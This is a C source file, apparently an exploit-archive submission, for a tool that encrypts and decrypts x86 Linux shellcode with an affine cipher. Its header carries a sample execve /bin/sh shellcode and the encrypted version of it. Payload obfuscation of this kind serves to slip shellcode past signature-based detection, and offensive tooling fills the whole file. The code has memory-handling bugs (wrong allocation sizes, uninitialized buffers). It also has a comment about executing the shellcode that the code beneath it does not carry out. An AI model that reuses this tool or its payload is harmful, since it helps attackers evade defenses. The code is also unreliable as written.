/*
* Title: Linux/x86 - Shellcode Custom Cryptor using Affine cipher 
* Date: 09.03.2021
* Author: Xenofon Vassilakopoulos  
* github : @xen0vas
* Tested on: 
*
* - Linux kali 4.19.0-kali5-686-pae #1 SMP Debian 4.19.37-1kali1 (2019-05-09) i686 GNU/Linux
* - Linux slae 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
*
* gcc -m32 affine.c -o affine
* 
* [!] Usage : 
*
* encryption -> ./affine -e \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
*
* decryption -> ./affine -d \x07\x7d\x77\x78\x11\x78\x16\x20\x02\x06\x02\x06\x1b\x07\x16\x20\x16\x20\x02\x06\x16\x02\x16\x25\x16\x01\x20\x25\x01\x07\x11\x78\x20\x25\x01\x02\x11\x07\x20\x25\x01\x7d\x72\x78\x78\x72\x77\x7c\x20\x78
*/

#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/* 
* this function used to strip the \x chars from the string that holds the shellcode instructions.
* This operation has to be done because every char must be changed into its decimal equivelant from ASCII
* table in order to apply the affine cipher to it. 
*/
char *hexToStrip(char *shellcode, size_t si)
{
size_t s = strlen(shellcode);
char *buf = (char*)malloc((s + 1) * sizeof(buf));
char *stringToStrip = (char*)malloc((s + 1) * sizeof(stringToStrip));
strcpy(stringToStrip,shellcode);
size_t stringLen = strlen(stringToStrip);
unsigned int i,j = 0;

char currentChar;

for (j = 0; j<stringLen+1;  j++) {
    currentChar = stringToStrip[j];
    if (currentChar != '\\' && currentChar != 'x')
    {
         sprintf(buf + strlen(buf),"%c",currentChar);
    }
}
return buf;
}


/*
* this function used to convert the shellcode string into hex in order to execute in memory,
* thus every char of the shellcode must be casted first into integer and then into unsigned char 
* and also by addinng the \x value between every iteration. 
*/

char *charTohex(char *shellcode, size_t si)
{
char *chr = (char*)calloc(si+1 , sizeof(chr));
int l;
for (l=0; l<si; l++) {
       sprintf(chr + strlen(chr),"\\x%02x", (unsigned char)(int)shellcode[l]);
}
return chr;
}


unsigned char *hexTochar(char *shellcode) {
    char *end;
    unsigned long int j = strtol(shellcode, &end, 16);
    char* str = (char*)calloc(strlen(shellcode), sizeof(str));
    int i=0;
    for ( ;; ) {
        sprintf(str + i * sizeof(char),"%c", (int)j);
        i++;
        j = strtol(end, &end, 16);
	if (j == 0)
	    break; 
    }
    return str;
}


/*
* Affine cipher - encryption function
*/
char *encryption(char* buffer, size_t len)
{
int y = 0;
int x = 0;

unsigned char *buf =  (unsigned char*)malloc((len+1) * sizeof(buf));
unsigned char *buf2 = (unsigned char*)malloc((len+1) * sizeof(buf2));

unsigned int k;
for(k=0; buffer[k]!='\0'; k++)
{
     x = buffer[k];
     // affine encryption formula
     y = (x * ((1 << 2) + 1) + 8) & ((32 << 2) - 1);
     //y = (5 * x + 8) % 128;
     buf2[k] = y;
     sprintf(buf + strlen(buf), "\\x%02x", buf2[k]);
}

printf("\n");
return buf;
}

/*
* Affine cipher - decryption function
*/
char *decryption(char* shellcode, size_t len)
{
unsigned int  k, y1=0,y2=0,x1=0, x2=0;

char *b  =  (char*)malloc((len+1) * sizeof(b));
char *b2 =  (char*)malloc((len+1) * sizeof(b2));
char *b3 =  (char*)malloc((len+1) * sizeof(b3));

for(k=0; shellcode[k]!='\0'; k+=2)
{
     y1 = shellcode[k];
     y2 = shellcode[k+1];
     //affine decryption formula
     x1 =  (y1 - 8) * ((18 << 2) + 5) & ((32 << 2) - 1);
     x2 =  (y2 - 8) * ((18 << 2) + 5) & ((32 << 2) - 1);
     b[k] = x1;
     b[k+1] = x2;
     sprintf(b2 + strlen(b2), "%c%c ", b[k],b[k+1]);
     sprintf(b3 + strlen(b3), "\\x%c%c", b[k],b[k+1]);
}

memcpy(shellcode, b2, strlen(b2)+1);
free(b2);
free(b);
return b3;
}

void message(char *msg)
{
   printf("\n\n[x] Error: %s \n\n[!] Usage: ./affine <option> <shellcode> \n\nOptions: \n\t -d : Decryption \n\t -e : Encryption\n\n", msg);
}

unsigned char* toCharByte(char *byte)
{
    if (byte == NULL || !strcmp(byte, ""))
    {
    	  return NULL;
    }
    unsigned int k,len = strlen(byte);
    char cbyte[len];
    strcpy(cbyte, byte);

    // allocate the 1/3 of the total char size
    unsigned char* str = (unsigned char*)calloc(len / 3, sizeof(str));
    unsigned char* chr = (unsigned char*)calloc(len / 3 , sizeof(chr));
    char* alpha = (char*)malloc((len / 3) * sizeof(alpha));

    char *ch = strtok(cbyte, "\\x");
    while(ch != NULL)
    {
        sprintf(alpha + strlen(alpha), "%s", ch );
        ch = strtok(NULL, "\\x");
    }

    for(k=0; alpha[k]!='\0'; k+=2)
    {
       sprintf(str + strlen(str), "%c%c ",  alpha[k], alpha[k+1]);
    }
    chr =  hexTochar(str);
    free(str);
    free(alpha);
    return chr;
}

int main(int argc, char **argv)
{

if (  argc < 2 || argc < 3  )
{
        message("Provide an option and a valid shellcode\n");
        return 1;
}

unsigned char *shellcode = toCharByte(argv[2]); 

if (shellcode != NULL && strncmp(argv[1],"-e",2) == 0)
{
//encryption
size_t si = strlen(shellcode);
printf("\n\n[!] Affine Encryption\n\n");
printf("\n[+] Shellcode:\n");

char *chr = charTohex(shellcode, si);

printf("\n%s\n",chr);

char *ptx = hexToStrip(chr, si);
char *ctx = encryption(ptx, strlen(ptx));
printf("\n[-] Encrypted Shellcode:\n\n");
printf("\n%s\n",ctx);
size_t l = strlen(ctx) / 4;

printf("\n[+] Encrypted Shellcode Length = %d\n",l);
printf("\n");

}
else if (shellcode != NULL && strncmp(argv[1],"-d",2) == 0)
{
//decryption
size_t len = strlen(shellcode);

unsigned char hex[len];
memcpy(hex,shellcode, strlen(shellcode)+1);

printf("\n\n[-] Affine Decryption\n\n");

printf("\n[-] Encrypted Shellcode:\n\n");
char *tohex = charTohex(shellcode, len);
size_t l = strlen(tohex) / 4;
printf("\n%s\n",tohex);

printf("\n[+] Encrypted Shellcode Length = %d\n",l);
printf("\n");

char *hexfromchr = decryption(hex, len);

printf("\n[-] Decrypted Shellcode:\n");
printf("\n%s\n",hexfromchr);

printf("\n[+] Decrypted Shellcode Length = %d\n",strlen(hexfromchr) / 4);
printf("\n");

//execute the shellcode after decryption
unsigned char* chr = hexTochar(hex);

free(hexfromchr);
}
else if ( (strncmp(argv[1],"-d",2) != 0) || (strncmp(argv[1],"-e",2) != 0) ) 
message("Provide an option\n");

return 0;
}

